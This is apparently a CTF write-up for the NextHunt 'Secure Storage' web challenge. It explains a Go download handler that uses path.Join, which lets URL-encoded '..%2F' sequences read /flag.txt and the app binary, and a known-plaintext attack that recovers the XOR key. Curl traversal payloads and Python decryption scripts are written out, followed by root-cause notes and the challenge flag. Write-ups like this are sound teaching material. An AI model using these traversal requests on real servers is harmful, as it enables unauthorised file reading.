---
title: "Secure Storage"
slug: nexthunt-secure-storage
excerpt: "Path Traversal + Known Plaintext Attack on XOR encryption"
coverImage: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800"
coverImageAlt: "Secure Storage - NextHunt CTF writeup"
categories:
  - NextHunt CTF
  - Web
  - Path Traversal
  - Crypto
date: 2025-01-25
showToc: true
---

The challenge presents a "Secure Storage" web application that allows users to upload and download files. The files are encrypted using XOR encryption with a session-specific key.

## Initial Analysis

Key observations from analyzing `main.go`:

- **File Upload/Download System**: Users can upload files which are encrypted with XOR before storage
- **Session Management**: Each session gets a unique encryption key (64 bytes) stored in SQLite database
- **Encryption**: Files are XOR encrypted with the session key using `xorCopy()` function
- **File Paths**: Upload uses `filepath.Join()` with sanitization, but download uses `path.Join()`

## Vulnerability: Path Traversal

The critical vulnerability is in the `handleDownload` function:

```go
fileName := r.PathValue("file")
filePath := path.Join(dir, fileName)
```

**The Bug:**

- The download handler uses `path.Join()` instead of `filepath.Join()`
- `path.Join()` is designed for URL paths, not filesystem paths
- URL-encoded path traversal sequences like `..%2F` are NOT cleaned by the Go HTTP router
- After URL decoding, `..%2F` becomes `../` which allows directory traversal

## Exploitation Strategy

The path traversal allows reading arbitrary files, but there's a catch:

1. The flag is located at `/flag.txt`
2. When downloading ANY file, it gets XOR encrypted with the session key
3. Downloaded flag = `plaintext_flag XOR key`
4. **We need the XOR key to decrypt the flag!**

### Getting the Encryption Key

1. **Download the Go binary** at `/app/main` using path traversal
2. The binary is a **known ELF format** with predictable header bytes
3. Build the same binary locally to get the exact plaintext
4. XOR the downloaded (encrypted) binary with local binary to extract the key:
   `key = encrypted_binary XOR known_plaintext_binary`
5. Use the extracted key to decrypt the flag

## Exploitation Steps

### Step 1: Download Encrypted Flag

```bash
curl "http://target/download/..%2F..%2F..%2F..%2Fflag.txt" \
  -b "sid=YOUR_SESSION_COOKIE"
```

### Step 2: Download the Binary to Extract Key

```bash
curl "http://target/download/..%2F..%2F..%2F..%2Fapp%2Fmain" \
  -b "sid=YOUR_SESSION_COOKIE" \
  -o main_encrypted
```

### Step 3: Build Local Binary

```bash
go build -o main_local main.go
```

### Step 4: Extract the 64-byte XOR Key

```python
#!/usr/bin/env python3

with open('main_encrypted', 'rb') as f:
    encrypted_binary = f.read()

with open('main_local', 'rb') as f:
    local_binary = f.read()

# Extract 64-byte key by XORing first 64 bytes
key = bytearray(64)
for i in range(64):
    key[i] = encrypted_binary[i] ^ local_binary[i]

print(f"Key: {key.hex()}")
```

### Step 5: Decrypt the Flag

```python
#!/usr/bin/env python3

key = bytes.fromhex("3e1169a2c4f80a4c...")  # extracted key
encrypted_flag = bytes.fromhex("507411d7b783667f...")  # from step 1

flag = bytearray()
for i in range(len(encrypted_flag)):
    flag.append(encrypted_flag[i] ^ key[i % 64])

print(flag.decode())
```

## Root Cause Analysis

- **Incorrect Path Function**: Using `path.Join()` (URL paths) instead of `filepath.Join()` (filesystem paths)
- **Missing Input Validation**: No sanitization on the `fileName` parameter in download handler
- **Inconsistent Security**: Upload properly sanitizes with `filepath.Base()`, but download doesn't

## Key Takeaways

- **Path vs Filepath**: Go's `path` package is for URLs, `filepath` is for filesystem paths
- **Known Plaintext Attacks**: XOR encryption is vulnerable when attackers can access both ciphertext and plaintext
- **Defense in Depth**: Multiple controls prevent exploitation

## Flag

```
nexus{l34k_7h3_k3y_br34k7h3_c1ph3r}
```
